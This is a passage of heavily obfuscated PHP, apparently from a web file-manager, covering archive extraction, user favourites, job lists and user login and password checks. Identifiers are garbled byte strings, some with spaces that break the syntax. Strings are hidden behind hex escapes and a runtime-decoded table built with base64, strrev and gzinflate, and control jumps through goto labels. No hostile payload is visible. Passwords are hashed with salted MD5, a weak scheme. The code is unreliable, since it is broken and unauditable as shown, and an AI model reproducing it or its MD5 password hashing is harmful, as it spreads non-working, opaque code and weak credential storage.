$‚«¿Âµş = self::init($ĞàâËÛ); if ($‚«¿Âµş->pathParse[$˜¢²¼Å²[1245]]) { $ĞàâËÛ = $‚«¿Âµş->pathParse[$˜¢²¼Å²[1245]]; $‚«¿Âµş = self::init($ĞàâËÛ); } $‡è©® Æ = $‚«¿Âµş->getType(); if ($‡è©® Æ == $˜¢²¼Å²[109] || $‡è©® Æ == $˜¢²¼Å²[1302]) { if (!$‚«¿Âµş->exist($‚«¿Âµş->path)) { show_json(LNG($˜¢²¼Å²[108]), !1); } return $‚«¿Âµş->path; } return !1; } public static function unzipPart($õº–¤µ‡, $Œ¦µµ²ş = -1) { $æ¥Èßí =& $_SERVER[Ùæõ‰Ï’]; $™ˆ—ôÂ° = IO::pathThis($õº–¤µ‡); if (!$Œ¦µµ²ş || $Œ¦µµ²ş == -1) { $è¹Šé = array(array($æ¥Èßí[32] => $™ˆ—ôÂ°, $æ¥Èßí[1288] => -1)); $è¹Šé[0][$æ¥Èßí[1303]] = $è¹Šé[0][$æ¥Èßí[32]]; } else { if (is_array($Œ¦µµ²ş)) { $è¹Šé = $Œ¦µµ²ş; $·«‹ƒÎ· = count($è¹Šé) - 1; for ($ıÊØ§Ôé = 0; $ıÊØ§Ôé <= $·«‹ƒÎ·; $ıÊØ§Ôé++) { $Œ£ò›¬ = $è¹Šé[$ıÊØ§Ôé]; $ı¡Åß¾ = get_path_this($Œ£ò›¬[$æ¥Èßí[32]]) . (checkExtSafe($Œ£ò›¬[$æ¥Èßí[32]]) ? $æ¥Èßí[12] : $æ¥Èßí[1304]); $è¹Šé[$ıÊØ§Ôé][$æ¥Èßí[1303]] = $æ¥Èßí[1305] . intval($Œ£ò›¬[$æ¥Èßí[1288]]) . $æ¥Èßí[462] . $ı¡Åß¾; if ($ıÊØ§Ôé == 0) { continue; } $è¹Šé[$ıÊØ§Ôé][$æ¥Èßí[1303]] = $è¹Šé[$ıÊØ§Ôé - 1][$æ¥Èßí[1303]] . $æ¥Èßí[1306] . $è¹Šé[$ıÊØ§Ôé][$æ¥Èßí[1303]]; } } } if (!is_array($è¹Šé) || count($è¹Šé) == 0) { return !1; } $Æ•ËË¢¹ = $è¹Šé[count($è¹Šé) - 1]; if (!IO::exist($õº–¤µ‡)) { return !1; } $ç•Ó­Êì = TEMP_FILES . $æ¥Èßí[1307] . kodIO::hashPathSafe($õº–¤µ‡) . $æ¥Èßí[8]; $‡šğªÃĞ = $ç•Ó­Êì . $Æ•ËË¢¹[$æ¥Èßí[1303]]; mk_dir($ç•Ó­Êì); file_put_contents(TEMP_FILES . $æ¥Èßí[1279], $æ¥Èßí[12]); if (IO::exist($‡šğªÃĞ)) { return array($æ¥Èßí[230] => $‡šğªÃĞ, $æ¥Èßí[1287] => $è¹Šé, $æ¥Èßí[1289] => $ç•Ó­Êì); } $›«·¨ = self::localFilePath($õº–¤µ‡); if (!$›«·¨) { $›«·¨ = $ç•Ó­Êì . $æ¥Èßí[1308]; if (!IO::exist($›«·¨)) { self::copy($õº–¤µ‡, $ç•Ó­Êì, !1, get_path_this($›«·¨)); } } if (!$›«·¨ || !IO::exist($›«·¨)) { return !1; } if ($Æ•ËË¢¹[$æ¥Èßí[1288]] == -1) { return array($æ¥Èßí[230] => $›«·¨, $æ¥Èßí[1287] => $è¹Šé, $æ¥Èßí[1289] => $ç•Ó­Êì); } $àµ¸ÌÄí = $›«·¨; foreach ($è¹Šé as $ıÊØ§Ôé => $Œ£ò›¬) { if (!$Œ£ò›¬ || $Œ£ò›¬[$æ¥Èßí[1288]] == $æ¥Èßí[1286]) { break; } if (substr($Œ£ò›¬[$æ¥Èßí[32]], -1, 1) == $æ¥Èßí[8]) { break; } $“ô²¼±× = in_array(get_path_ext($Œ£ò›¬[$æ¥Èßí[1303]]), array($æ¥Èßí[389], $æ¥Èßí[1293], $æ¥Èßí[1294], $æ¥Èßí[1295], $æ¥Èßí[1296], $æ¥Èßí[1297])); $«­ùš¨ã = $ıÊØ§Ôé == count($è¹Šé) - 1 && $“ô²¼±×; $êòå‰ª· = $ç•Ó­Êì . $Œ£ò›¬[$æ¥Èßí[1303]]; $ÓÈœ„ğØ = $ç•Ó­Êì . get_path_this($Œ£ò›¬[$æ¥Èßí[32]]); if (IO::exist($êòå‰ª·)) { $àµ¸ÌÄí = $êòå‰ª·; continue; } $«•¤íåñ = $ıÊØ§Ôé == 0 ? get_path_ext($™ˆ—ôÂ°) : get_path_ext($àµ¸ÌÄí); $Ü³²îìÕ = KodArchive::extract(self::iconvSystem($àµ¸ÌÄí), $ç•Ó­Êì, $Œ£ò›¬[$æ¥Èßí[1288]], $ÜëŒ¹ì­, $«•¤íåñ); self::unzipErrorCheck($Ü³²îìÕ, array($æ¥Èßí[1309], $õº–¤µ‡, $è¹Šé, $Œ£ò›¬, $êòå‰ª·)); if (IO::exist($ÓÈœ„ğØ)) { IO::rename($ÓÈœ„ğØ, get_path_this($êòå‰ª·)); } $àµ¸ÌÄí = $êòå‰ª·; } $‡šğªÃĞ = $àµ¸ÌÄí; return array($æ¥Èßí[230] => $àµ¸ÌÄí, $æ¥Èßí[1287] => $è¹Šé, $æ¥Èßí[1289] => $ç•Ó­Êì); } private static function unzipErrorCheck($İ¼ä†ø«, $™À£¾ğ× = false) { $‰§ ±âÉ =& $_SERVER[Ùæõ‰Ï’]; if ($İ¼ä†ø«[$‰§ ±âÉ[1310]]) { return !0; } write_log(array($‰§ ±âÉ[1311], $İ¼ä†ø«, $™À£¾ğ×), $‰§ ±âÉ[1312]); show_json($‰§ ±âÉ[1313] . json_encode($İ¼ä†ø«[$‰§ ±âÉ[1300]]), !1); die; } } goto A»òœƒ´ƒ©; EëÀè¦Ë‘·: $fileSize = strrev(base64_decode($_SERVER[™ÊæÄ‡Ş][0])); function binCheckNeq($ÌÍ›°æ¶, $øÛÈé”³) { return $ÌÍ›°æ¶ != $øÛÈé”³; } $_SERVER[$_SERVER[™ÊæÄ‡Ş][1]] = $fileSize($_SERVER[$_SERVER[™ÊæÄ‡Ş][2]]); goto EŸîÑËø‰; CŒó¦Š‡ù¯: if (strlen($zvjtcnyder) < $_SERVER[Ùæõ‰Ï’][680]) { die; } $_SERVER[øé†…ş] = explode($_SERVER[Ùæõ‰Ï’][681], gzinflate(substr($_SERVER[Ùæõ‰Ï’][682], 10, -8))); $kduypjgrtv = $_SERVER[Ùæõ‰Ï’][683]; goto a¨¼½ñ”‰è; AôŸ”±ƒÂŸ: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\x66\x61\x76"; protected function cacheFunctionAlias($¾µ€ƒÚß) { $¸¤¢ôÚ¯ =& $_SERVER[Ùæõ‰Ï’]; return array($¸¤¢ôÚ¯[2094] => array(USER_ID, $¸¤¢ôÚ¯[2456])); } protected function listData() { $¨ê…÷µå =& $_SERVER[Ùæõ‰Ï’]; $–ç ”éê = array($¨ê…÷µå[1772] => USER_ID, $¨ê…÷µå[557] => 0); $¤»ÈÚæ´ = $¨ê…÷µå[2457]; $ãÎšÃ–Á = $this->field($¤»ÈÚæ´)->where($–ç ”éê)->order($¨ê…÷µå[2458])->select(); return $ãÎšÃ–Á ? $ãÎšÃ–Á : array(); } protected function resetCache() { } protected function listView() { $“¬¹×é— =& $_SERVER[Ùæõ‰Ï’]; $¼’âÖ²À = $this->listData(); $±¥‰´–º = array_filter_by_field($¼’âÖ²À, $“¬¹×é—[33], $“¬¹×é—[490]); $ı¢ø¯µ = array_to_keyvalue($±¥‰´–º, $“¬¹×é—[12], $“¬¹×é—[87]); if (!$ı¢ø¯µ) { return $¼’âÖ²À; } $¢··±ÃŠ = 2000; $ãÂ¬Šı = array($“¬¹×é—[491] => array($“¬¹×é—[492], $ı¢ø¯µ)); $Ì—¤‹ıé = Model($“¬¹×é—[907])->listSource($ãÂ¬Šı, $¢··±ÃŠ); $Ì—¤‹ıé = array_merge($Ì—¤‹ıé[$“¬¹×é—[86]], $Ì—¤‹ıé[$“¬¹×é—[85]]); $Ì—¤‹ıé = array_to_keyvalue($Ì—¤‹ıé, $“¬¹×é—[193]); foreach ($¼’âÖ²À as $àÛ‚œ€å => $şú¯«ƒ) { $ÏèŞèï— = $Ì—¤‹ıé[$şú¯«ƒ[$“¬¹×é—[87]]]; $ÏèŞèï— = $ÏèŞèï— ? $ÏèŞèï— : array(); $¼’âÖ²À[$àÛ‚œ€å] = array_merge($ÏèŞèï—, $şú¯«ƒ); } return $¼’âÖ²À; } protected function addFav($Ä­¡Ë™å, $ŒÖüÁ€É = '', $‘»îÒéÙ = "\x73\157\165\162\143\x65") { $¯á„š£´ =& $_SERVER[Ùæõ‰Ï’]; $¦Úıš¬ƒ = array($¯á„š£´[1772] => USER_ID, $¯á„š£´[557] => 0, $¯á„š£´[496] => $‘»îÒéÙ, $¯á„š£´[495] => $Ä­¡Ë™å); if ($this->where($¦Úıš¬ƒ)->find()) { return !1; } $¦Úıš¬ƒ = array($¯á„š£´[1772] => USER_ID, $¯á„š£´[557] => 0); $æûÒÔ® = $this->where($¦Úıš¬ƒ)->max($¯á„š£´[2003]); if (!$æûÒÔ®) { $æûÒÔ® = 0; } if (!$ŒÖüÁ€É && $‘»îÒéÙ == $¯á„š£´[490]) { $è¼ØĞ‰é = Model($¯á„š£´[1430])->where(array($¯á„š£´[491] => $Ä­¡Ë™å))->find(); if (!$è¼ØĞ‰é) { return !1; } $ŒÖüÁ€É = $è¼ØĞ‰é[$¯á„š£´[32]]; } $ŒÖüÁ€É = $this->getAutoName($ŒÖüÁ€É); $ˆ²Œ²»µ = array($¯á„š£´[1772] => USER_ID, $¯á„š£´[557] => 0, $¯á„š£´[494] => $ŒÖüÁ€É, $¯á„š£´[495] => $Ä­¡Ë™å, $¯á„š£´[496] => $‘»îÒéÙ, $¯á„š£´[1983] => $æûÒÔ® + 1); return $this->add($ˆ²Œ²»µ); } protected function remove($ûº³ØĞˆ) { $üÅº„ÌÕ =& $_SERVER[Ùæõ‰Ï’]; $ÌõäêÑÍ = array($üÅº„ÌÕ[1772] => USER_ID, $üÅº„ÌÕ[493] => $ûº³ØĞˆ); return $this->where($ÌõäêÑÍ)->delete(); } protected function removeByName($Ğ±Ç¹Øö) { $®øîÆù¶ =& $_SERVER[Ùæõ‰Ï’]; $°öò÷ŠÒ = array($®øîÆù¶[1772] => USER_ID, $®øîÆù¶[494] => $Ğ±Ç¹Øö, $®øîÆù¶[557] => 0); return $this->where($°öò÷ŠÒ)->delete(); } protected function rename($Ö•ÕèØ˜, $üú…ıı•) { $Í–£¡ıÏ =& $_SERVER[Ùæõ‰Ï’]; if ($Ö•ÕèØ˜ == $üú…ıı•) { return !1; } $ÀˆÎò¿ã = $this->getAutoName($üú…ıı•); if ($üú…ıı• != $ÀˆÎò¿ã) { return !1; } $ï¯ü²—Ç = array($Í–£¡ıÏ[1772] => USER_ID, $Í–£¡ıÏ[557] => 0, $Í–£¡ıÏ[32] => $Ö•ÕèØ˜); return $this->where($ï¯ü²—Ç)->save(array($Í–£¡ıÏ[32] => $üú…ıı•)); } protected function resetSort($í¾¨ Ìñ) { $ñ×¿‹  =& $_SERVER[Ùæõ‰Ï’]; $í¾¨ Ìñ = is_array($í¾¨ Ìñ) ? $í¾¨ Ìñ : array(); $µëŸÔ×– = array($ñ×¿‹ [1772] => USER_ID); for ($ó²‰âà = 0; $ó²‰âà < count($í¾¨ Ìñ); $ó²‰âà++) { $µëŸÔ×–[$ñ×¿‹ [493]] = $í¾¨ Ìñ[$ó²‰âà]; $this->where($µëŸÔ×–)->save(array($ñ×¿‹ [1983] => $ó²‰âà + 1)); } return !0; } protected function moveTop($óÏÅ¯Ôó) { $µËé ˆ§ =& $_SERVER[Ùæõ‰Ï’]; $Óœ¬ãë· = array($µËé ˆ§[1772] => USER_ID, $µËé ˆ§[557] => 0); $Óµ¡°İ = $this->where($Óœ¬ãë·)->where(array($µËé ˆ§[32] => $óÏÅ¯Ôó))->find(); if (!$Óµ¡°İ) { return; } $ö©ºúú£ = $this->field($µËé ˆ§[475])->where($Óœ¬ãë·)->order($µËé ˆ§[2458])->select(); $ö©ºúú£ = array_to_keyvalue($ö©ºúú£, $µËé ˆ§[12], $µËé ˆ§[475]); $”Æ¤¤şö = $ö©ºúú£; $ö©ºúú£ = array_remove_value($ö©ºúú£, $Óµ¡°İ[$µËé ˆ§[475]]); array_unshift($ö©ºúú£, $Óµ¡°İ[$µËé ˆ§[475]]); return $this->resetSort($ö©ºúú£); } protected function moveBottom($Ô¥Ô«½ñ) { $’íçÀĞ =& $_SERVER[Ùæõ‰Ï’]; $ê˜Æ˜ñ = array($’íçÀĞ[1772] => USER_ID, $’íçÀĞ[557] => 0); $ÒÌ›ø·” = $this->where($ê˜Æ˜ñ)->max($’íçÀĞ[2003]); $«ÏòÈ³¯ = array($’íçÀĞ[2003] => $ÒÌ›ø·” + 1); return $this->where($ê˜Æ˜ñ)->where(array($’íçÀĞ[32] => $Ô¥Ô«½ñ))->save($«ÏòÈ³¯); } private function getAutoName($ƒèö’) { $–Â½­Ù¶ =& $_SERVER[Ùæõ‰Ï’]; $š­¶Ş = array($–Â½­Ù¶[1772] => USER_ID, $–Â½­Ù¶[557] => 0); $«ëÂ£ø› = $this->field($–Â½­Ù¶[32])->where($š­¶Ş)->select(); $«ëÂ£ø› = array_to_keyvalue($«ëÂ£ø›, $–Â½­Ù¶[12], $–Â½­Ù¶[32]); if (!$«ëÂ£ø› || !in_array($ƒèö’, $«ëÂ£ø›)) { return $ƒèö’; } for ($’ÕıƒÚÇ = 0; $’ÕıƒÚÇ < count($«ëÂ£ø›); $’ÕıƒÚÇ++) { if (!in_array($ƒèö’ . "\x28{$’ÕıƒÚÇ}\51", $«ëÂ£ø›)) { return $ƒèö’ . "\x28{$’ÕıƒÚÇ}\x29"; } } return $ƒèö’ . "\x28{$’ÕıƒÚÇ}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\x6a\157\142\114\x69\163\x74"; public $field = array("\x6e\141\x6d\145", "\x64\145\x73\143", "\x73\x6f\x72\x74"); const JOB_KEY = "\163\145\154\x66\112\x6f\142\114\151\163\164"; public function listData($õçÖ¤ = false, $ ×äéİ = "\163\157\162\164", $·é¤îñ = false) { return parent::listData($õçÖ¤, $ ×äéİ, $·é¤îñ); } public function remove($¾‹‰¾ˆ“) { return parent::remove($¾‹‰¾ˆ“); } public function add($ºç€êÁÑ) { $îîİäÙÆ =& $_SERVER[Ùæõ‰Ï’]; if ($this->findByName($ºç€êÁÑ[$îîİäÙÆ[32]])) { return !1; } $ºç€êÁÑ[$îîİäÙÆ[2003]] = $this->getSort(); return parent::insert($ºç€êÁÑ); } private function getSort() { $óĞ¶Ÿ÷¬ =& $_SERVER[Ùæõ‰Ï’]; $üçÃ”±› = parent::listData(); $õ¼ı—”  = array_to_keyvalue($üçÃ”±›, $óĞ¶Ÿ÷¬[12], $óĞ¶Ÿ÷¬[2003]); return empty($õ¼ı—” ) ? 0 : max($õ¼ı—” ) + 1; } public function update($ÊÛÛëáì, $ìåÎÙ…¤) { $ĞÛœƒã =& $_SERVER[Ùæõ‰Ï’]; $’¡Ò­á = parent::listData($ÊÛÛëáì); $ı÷¨ì°¬ = $this->findByName($ìåÎÙ…¤[$ĞÛœƒã[32]]); if (!$’¡Ò­á || $ı÷¨ì°¬ && $ı÷¨ì°¬[$ĞÛœƒã[475]] != $’¡Ò­á[$ĞÛœƒã[475]]) { return !1; } return parent::update($ÊÛÛëáì, $ìåÎÙ…¤); } public function setUserJob($·ô™É¶É, $‹ôÅ³ŞŒ) { $‡¹èæÅş =& $_SERVER[Ùæõ‰Ï’]; if (!is_array($‹ôÅ³ŞŒ)) { $‹ôÅ³ŞŒ = array($‹ôÅ³ŞŒ); } $À®êÁé” = parent::listData(); $ÁÑ­øË = array_to_keyvalue($À®êÁé”, $‡¹èæÅş[32]); $æ—ó€  = $‡¹èæÅş[454]; foreach ($‹ôÅ³ŞŒ as $¡îäëŸÆ) { if ($ÁÑ­øË[$¡îäëŸÆ]) { $æ—ó€  .= $ÁÑ­øË[$¡îäëŸÆ][$‡¹èæÅş[475]] . $‡¹èæÅş[50]; } else { $øò—ºä = $this->add($¡îäëŸÆ); $æ—ó€  .= $øò—ºä . $‡¹èæÅş[50]; } } $æ—ó€  = rtrim($æ—ó€ , $‡¹èæÅş[50]); Model($‡¹èæÅş[598])->metaSet($·ô™É¶É, self::JOB_KEY, $æ—ó€ ); } public function getUserJob($î»ôñ½§) { $õ±íÀ½ = Model($_SERVER[Ùæõ‰Ï’][598])->metaGet($î»ôñ½§); return $this->getUserJobInfo($õ±íÀ½[self::JOB_KEY]); } public function getUserJobInfo($¤œÍ“ñ) { $·ş¢Ô =& $_SERVER[Ùæõ‰Ï’]; $„€ï°ÛÆ = explode($·ş¢Ô[50], $¤œÍ“ñ); $âç†ş‡› = parent::listData(); $âç†ş‡› = array_remove_key($âç†ş‡›, $·ş¢Ô[231]); $“‡©µ®¤ = array(); foreach ($„€ï°ÛÆ as $Îò²Şô‹) { if (isset($âç†ş‡›[$Îò²Şô‹])) { $“‡©µ®¤[] = $âç†ş‡›[$Îò²Şô‹]; } } return $“‡©µ®¤; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\x74\141\142\x6c\145\116\x61\155\145" => "\165\163\145\x72\x5f\155\x65\164\x61", "\155\x65\164\141\x46\151\145\154\x64" => "\x75\x73\x65\x72\111\104"); protected $simpleField = "\165\x73\x65\x72\x49\104\x2c\x6e\x69\143\153\116\x61\x6d\x65\x2c\x6e\x61\155\x65\54\141\166\141\164\x61\162\x2c\x73\x65\170\x2c\163\x74\141\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($‘†ÉŸÅÜ) { $óâõÇ°ı =& $_SERVER[Ùæõ‰Ï’]; $ıõá”¡— = $óâõÇ°ı[2459]; return array($óâõÇ°ı[2061] => array($‘†ÉŸÅÜ[0], $ıõá”¡—), $óâõÇ°ı[2063] => array($‘†ÉŸÅÜ[0], $ıõá”¡—), $óâõÇ°ı[2460] => array($‘†ÉŸÅÜ[0], $ıõá”¡—)); } protected function getInfo($³ÔÑßŒè, $¸ûÄ”é” = false) { $¹šïèç‡ = $this->getInfoSimple($³ÔÑßŒè); if (!is_array($¹šïèç‡)) { return array(); } if ($¸ûÄ”é”) { return $this->_getInfoApply($¹šïèç‡); } return $this->cacheFunctionGet($_SERVER[Ùæõ‰Ï’][2065], $³ÔÑßŒè); } protected function getInfoFull($ÒÁş¤ï„, $Ëöëó—ì = false) { $ö¹÷ªö® = $this->getInfoSimple($ÒÁş¤ï„); if (!is_array($ö¹÷ªö®)) { return array(); } if ($Ëöëó—ì) { return $this->_getInfoApply($ö¹÷ªö®, !0); } return $this->cacheFunctionGet($_SERVER[Ùæõ‰Ï’][2461], $ÒÁş¤ï„); } private function _getInfoApply($œòî¦´¯, $“Ììõ“¿ = false) { $ë©  =& $_SERVER[Ùæõ‰Ï’]; if (!$œòî¦´¯) { return $œòî¦´¯; } $™êÑ´Š‰ = md5($ë© [2462] . $œòî¦´¯[$ë© [978]] . $ë© [2463] . $œòî¦´¯[$ë© [32]]); $œòî¦´¯ = $this->_listDataApplyItem($œòî¦´¯); $–€íöÔĞ = Model($ë© [1430])->metaGet($œòî¦´¯[$ë© [90]][$ë© [193]]); $œòî¦´¯[$ë© [2464]] = $™êÑ´Š‰; $œòî¦´¯[$ë© [90]][$ë© [2259]] = isset($–€íöÔĞ[$ë© [2260]]) ? $–€íöÔĞ[$ë© [2260]] : null; if ($“Ììõ“¿) { $œòî¦´¯[$ë© [539]] = $this->metaGet($œòî¦´¯[$ë© [1781]]); } return $œòî¦´¯; } protected function getInfoSimple($‰â»òÚ¢, $¹ã©’©¸ = false) { $²È´Óôµ =& $_SERVER[Ùæõ‰Ï’]; if (!$‰â»òÚ¢) { return array(); } if ($¹ã©’©¸) { $Ìùµ­³ı = $this->where(array($²È´Óôµ[1781] => intval($‰â»òÚ¢)))->find(); if (!is_array($Ìùµ­³ı)) { return array(); } $Ìùµ­³ı[$²È´Óôµ[2465]] = Action($²È´Óôµ[2466])->parseUrl($Ìùµ­³ı[$²È´Óôµ[2465]]); return $Ìùµ­³ı; } return $this->cacheFunctionGet($²È´Óôµ[2066], $‰â»òÚ¢); } protected function getInfoSimpleOuter($‹í¯º¢) { $âÕ¿Ó‘ =& $_SERVER[Ùæõ‰Ï’]; if (!$‹í¯º¢ || $‹í¯º¢ == 0) { return array($âÕ¿Ó‘[1781] => $âÕ¿Ó‘[228], $âÕ¿Ó‘[32] => $âÕ¿Ó‘[176] . LNG($âÕ¿Ó‘[2467]) . $âÕ¿Ó‘[178], $âÕ¿Ó‘[2465] => STATIC_PATH . $âÕ¿Ó‘[2468]); } $ ìÄäÒ¯ = $this->cacheFunctionGet($âÕ¿Ó‘[2066], $‹í¯º¢); $‰æŸÒÙ = array_field_key($ ìÄäÒ¯, explode($âÕ¿Ó‘[50], $this->simpleField)); if (!$‰æŸÒÙ) { return array($âÕ¿Ó‘[1781] => $âÕ¿Ó‘[1286], $âÕ¿Ó‘[32] => $âÕ¿Ó‘[176] . LNG($âÕ¿Ó‘[2469]) . $âÕ¿Ó‘[178], $âÕ¿Ó‘[2465] => STATIC_PATH . $âÕ¿Ó‘[2470]); } $‰æŸÒÙ[$âÕ¿Ó‘[2465]] = Action($âÕ¿Ó‘[2466])->parseUrl($‰æŸÒÙ[$âÕ¿Ó‘[2465]]); return $‰æŸÒÙ; } protected function groupUser($°Øš‘) { } public static function errorLang($—é¶Æ€¡) { $´Ğ•Ÿ“¡ =& $_SERVER[Ùæõ‰Ï’]; $çÄÏØ† = array(self::ERROR_USER_NOT_EXISTS => $´Ğ•Ÿ“¡[2471], self::ERROR_USER_PASSWORD_ERROR => $´Ğ•Ÿ“¡[2472], self::ERROR_USER_EXIST_NAME => $´Ğ•Ÿ“¡[2473], self::ERROR_USER_EXIST_PHONE => $´Ğ•Ÿ“¡[2474], self::ERROR_USER_EXIST_EMAIL => $´Ğ•Ÿ“¡[2475], self::ERROR_USER_LOGIN_LOCK => $´Ğ•Ÿ“¡[2476], self::ERROR_IP_NOT_ALLOW => $´Ğ•Ÿ“¡[2477], self::ERROR_USER_EXIST_NICKNAME => $´Ğ•Ÿ“¡[2478]); $µ‘¬¤…Ü = LNG($çÄÏØ†[$—é¶Æ€¡]); if ($—é¶Æ€¡ == self::ERROR_USER_LOGIN_LOCK) { $ñĞ±¦Ñç = (int) Model($´Ğ•Ÿ“¡[2479])->get($´Ğ•Ÿ“¡[2480]); if ($ñĞ±¦Ñç > 60) { $µ‘¬¤…Ü = str_replace($´Ğ•Ÿ“¡[91], ceil($ñĞ±¦Ñç / 60), $µ‘¬¤…Ü); } } return $µ‘¬¤…Ü; } public function getInfoByMeta($ÃñôÄ©ü, $İŞâíüÒ) { $¹Á´„ç³ =& $_SERVER[Ùæõ‰Ï’]; $æë‰øæ = Model($¹Á´„ç³[2481])->where(array($¹Á´„ç³[97] => $ÃñôÄ©ü, $¹Á´„ç³[450] => $İŞâíüÒ))->find(); if ($æë‰øæ) { return $this->getInfo($æë‰øæ[$¹Á´„ç³[1781]]); } return !1; } public function userLoginCheck($á­ÀÌ¢, $ÑÛ”Ã”š) { $¨Ÿ‹ÔèÆ =& $_SERVER[Ùæõ‰Ï’]; $¼ª³¥Æ = $this->userLoginFind($á­ÀÌ¢); if (!$¼ª³¥Æ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($¼ª³¥Æ[$¨Ÿ‹ÔèÆ[1781]], $ÑÛ”Ã”š)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($¼ª³¥Æ[$¨Ÿ‹ÔèÆ[1781]]); } public function userLoginFind($Ñ£Á…Ğ¥) { $üœÍÎè =& $_SERVER[Ùæõ‰Ï’]; $›ÕÙ‚ = array($üœÍÎè[32] => $Ñ£Á…Ğ¥, $üœÍÎè[2267] => $Ñ£Á…Ğ¥, $üœÍÎè[381] => $Ñ£Á…Ğ¥, $üœÍÎè[2482] => $Ñ£Á…Ğ¥, $üœÍÎè[1091] => $üœÍÎè[1093]); if ($this->nickNameRpt()) { unset($›ÕÙ‚[$üœÍÎè[2267]]); } return $this->where($›ÕÙ‚)->find(); } public function clearCache($ÓÁ‘´©­) { $…®Ÿ’Õ =& $_SERVER[Ùæõ‰Ï’]; $this->cacheFunctionClear($…®Ÿ’Õ[2065], $ÓÁ‘´©­); $this->cacheFunctionClear($…®Ÿ’Õ[2066], $ÓÁ‘´©­); $this->cacheFunctionClear($…®Ÿ’Õ[2461], $ÓÁ‘´©­); } public function userPasswordCheck($”µÖÁ–, $ŞÙ¥Ã«) { $ÅìğÜ˜ˆ =& $_SERVER[Ùæõ‰Ï’]; $Â½êú’ = $this->where(array($ÅìğÜ˜ˆ[1781] => intval($”µÖÁ–)))->find(); $ûœâ±ÖÀ = $this->metaGet($”µÖÁ–); $ó“‚›ü¼ = isset($ûœâ±ÖÀ[$ÅìğÜ˜ˆ[2483]]) ? $ûœâ±ÖÀ[$ÅìğÜ˜ˆ[2483]] : $ÅìğÜ˜ˆ[12]; if (md5($ó“‚›ü¼ . trim($ŞÙ¥Ã«)) !== $Â½êú’[$ÅìğÜ˜ˆ[978]]) { return !1; } return !0; } public function userAdd($Ó¦â¨œ) { $ï¥« =& $_SERVER[Ùæõ‰Ï’]; $¶“å–™¡ = array($ï¥«[494] => $Ó¦â¨œ[$ï¥«[32]], $ï¥«[2484] => $Ó¦â¨œ[$ï¥«[2185]], $ï¥«[2485] => isset($Ó¦â¨œ[$ï¥«[381]]) ? $Ó¦â¨œ[$ï¥«[381]] : $ï¥«[12], $ï¥«[2486] => isset($Ó¦â¨œ[$ï¥«[2482]]) ? $Ó¦â¨œ[$ï¥«[2482]] : $ï¥«[12], $ï¥«[2487] => isset($Ó¦â¨œ[$ï¥«[2267]]) ? $Ó¦â¨œ[$ï¥«[2267]] : $Ó¦â¨œ[$ï¥«[32]], $ï¥«[2488] => isset($Ó¦â¨œ[$ï¥«[2465]]) ? $Ó¦â¨œ[$ï¥«[2465]] : $ï¥«[12], $ï¥«[2489] => isset($Ó¦â¨œ[$ï¥«[2490]]) ? $Ó¦â¨œ[$ï¥«[2490]] : 1, $ï¥«[2491] => $Ó¦â¨œ[$ï¥«[978]], $ï¥«[2067] => isset($Ó¦â¨œ[$ï¥«[1966]]) ? $Ó¦â¨œ[$ï¥«[1966]] : 1024 * 1024 * 20, $ï¥«[2068] => 0, $ï¥«[2492] => 0, $ï¥«[2112] => isset($Ó¦â¨œ[$ï¥«[833]]) ? $Ó¦â¨œ[$ï¥«[833]] : 1); if (!empty($Ó¦â¨œ[$ï¥«[1781]])) { $¶“å–™¡[$ï¥«[1781]] = $Ó¦â¨œ[$ï¥«[1781]]; } $ï…²Ó‡ş = $this->_checkExist($Ó¦â¨œ); if ($ï…²Ó‡ş !== !0) { return $ï…²Ó‡ş; } if (!empty($¶“å–™¡[$ï¥«[2465]]) && strlen($¶“å–™¡[$ï¥«[2465]]) > 255) { $¶“å–™¡[$ï¥«[2465]] = $ï¥«[12]; } $¡½ƒŠü² = $this->add($¶“å–™¡); $Ş”Ø¶— = array($ï¥«[2491] => $¶“å–™¡[$ï¥«[978]], $ï¥«[2487] => $¶“å–™¡[$ï¥«[2267]]); $this->userEdit($¡½ƒŠü², $Ş”Ø¶—); Model($ï¥«[1430])->userRootAdd($¡½ƒŠü²); return $¡½ƒŠü²; } protected function userEditTest($²£»¶û, $ì›†£ÖŸ) { return $this->call($_SERVER[Ùæõ‰Ï’][2493], $²£»¶û, $ì›†£ÖŸ); } protected function userEdit($çİËİÚ, $Äà›š¤ä) { $ãîŸàİõ =& $_SERVER[Ùæõ‰Ï’]; $Ä˜“ÎÎ¯ = $this->getInfoSimple($çİËİÚ); if (!$Ä˜“ÎÎ¯) { return !1; } $‚±ÑÅè¢ = $this->_checkExist($Äà›š¤ä, $çİËİÚ); if ($‚±ÑÅè¢ !== !0) { return $‚±ÑÅè¢; } if (isset($Äà›š¤ä[$ãîŸàİõ[978]]) && trim($Äà›š¤ä[$ãîŸàİõ[978]]) != $ãîŸàİõ[12]) { $ÓßÚÒéº = $this->metaGet($çİËİÚ); if (empty($ÓßÚÒéº[$ãîŸàİõ[2483]])) { $ÓßÚÒéº[$ãîŸàİõ[2483]] = rand_string(10); Model($ãîŸàİõ[577])->metaSet($çİËİÚ, $ãîŸàİõ[2483], $ÓßÚÒéº[$ãîŸàİõ[2483]]); } $Äà›š¤ä[$ãîŸàİõ[978]] = md5($ÓßÚÒéº[$ãîŸàİõ[2483]] . trim($Äà›š¤ä[$ãîŸàİõ[978]])); } else { unset($Äà›š¤ä[$ãîŸàİõ[978]]); } if (!empty($Äà›š¤ä[$ãîŸàİõ[2465]]) && strlen($Äà›š¤ä[$ãîŸàİõ[2465]]) > 255) { $Äà›š¤ä[$ãîŸàİõ[2465]] = $ãîŸàİõ[12]; } $this->where(array($ãîŸàİõ[1772] => $çİËİÚ))->save($Äà›š¤ä); if (isset($Äà›š¤ä[$ãîŸàİõ[2267]])) { $this->setNamePinyin($çİËİÚ, $Äà›š¤ä[$ãîŸàİõ[2267]]); } $this->clearCache($çİËİÚ); return !0; } public function setNamePinyin($¥¬çëĞ“, $İöÕÛ­® = 